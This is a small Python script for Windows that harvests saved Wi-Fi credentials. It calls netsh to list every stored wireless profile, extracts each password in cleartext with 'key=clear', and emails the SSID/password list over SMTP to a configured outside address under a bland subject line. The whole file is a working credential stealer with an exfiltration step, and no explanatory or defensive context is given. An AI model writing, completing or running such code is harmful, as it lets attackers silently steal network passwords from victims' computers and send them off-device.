import subprocess
from smtplib import SMTP

zmienna = subprocess.check_output(["netsh", "wlan", "show", "profiles"])


def clear_data(data):
    cleared_data = [str(i).lstrip("b'").rstrip("'") for i in data.split()]
    return cleared_data

def taking_wifi_ssid(data):
    list_of_wifi = []
    for index in range(len(data)):
        if data[index] == "Profile":
            list_of_wifi.append(data[index+2])
    return list_of_wifi


def taking_wifis_info(data):
    wifi_info = []
    for wifi in data:
        process_list_with_pass = subprocess.check_output(["netsh", "wlan", "show", "profiles", wifi, "key=clear"])
        wifi_info.append(clear_data(process_list_with_pass))
    return wifi_info


def taking_password(data):
    pass_list = []
    for wifi in data:
        for index in range(len(wifi)):
            if wifi[index] == "Content":
                pass_list.append(wifi[index+2])
    return pass_list

def making_dic(wifi, passw):
    list_of_dict = []
    for i, e in zip(wifi, passw):
        list_of_dict.append({"SSID": i, "PASS": e})
    return list_of_dict

def sending_data(data):
    message = "Subject: CmdNt \n\n"
    for dict in data:
        for key, value in dict.items():
            message = message + str(key) + " " + str(value) + " "
        message += '\n'
    print(message)
    smtp_object = SMTP('smtp', 587)
    smtp_object.ehlo()
    smtp_object.starttls()
    smtp_object.login('email-login', 'email.pass')
    smtp_object.sendmail(from_addr="email-from", to_addrs="email-to",
                         msg=message)
    smtp_object.quit()

if __name__ == '__main__':

    command = subprocess.check_output(["netsh", "wlan", "show", "profiles"])
    data = clear_data(command)
    wifi_list = taking_wifi_ssid(data)
    wifis_data = taking_wifis_info(wifi_list)
    pass_list = taking_password(wifis_data)
    dict_ssid_pass = making_dic(wifi_list,pass_list)
    sending_data(dict_ssid_pass)